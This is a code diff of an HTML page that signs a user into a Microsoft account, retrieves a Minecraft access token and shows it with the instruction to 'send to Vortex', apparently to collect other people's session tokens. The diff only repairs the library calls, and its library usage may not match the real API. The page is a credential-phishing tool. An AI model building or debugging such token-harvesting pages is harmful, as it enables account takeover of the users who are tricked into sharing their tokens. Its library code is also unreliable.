@@ -13,19 +13,27 @@
   <p>Click below to log in with your Microsoft account.</p>
   <button onclick="getToken()">Get Token</button>
   <div id="output"></div>
-  <script src="https://cdn.jsdelivr.net/npm/msmc@3.0.4/min.js"></script>
+
+  <!-- Correct MSMC library for browsers -->
+  <script src="https://cdn.jsdelivr.net/npm/msmc@3.0.4/web.js"></script>
+
   <script>
     async function getToken() {
       const output = document.getElementById('output');
       output.innerHTML = 'Loading...';
       try {
-        const auth = new MSMCAuth();
-        const token = await auth.launch('browser');
-        output.innerHTML = `
-          <p><strong>Email:</strong> ${token.profile.email || 'Unknown'}</p>
-          <p><strong>Token:</strong> ${token.access_token}</p>
-          <p>Copy both and send to Vortex!</p>
-        `;
+        const flow = new msmc.Authenticator(); // Correct way to use it in browser
+        await flow.launch("popup"); // You can also use "redirect"
+        if (flow.getState() === "Success") {
+          const token = await msmc.getMinecraftJavaToken(flow);
+          output.innerHTML = `
+            <p><strong>Email:</strong> ${token.profile.name || 'Unknown'}</p>
+            <p><strong>Token:</strong> ${token.access_token}</p>
+            <p>Copy both and send to Vortex!</p>
+          `;
+        } else {
+          output.innerHTML = `Error: Authentication failed.`;
+        }
       } catch (err) {
         output.innerHTML = `Error: ${err.message}`;
       }
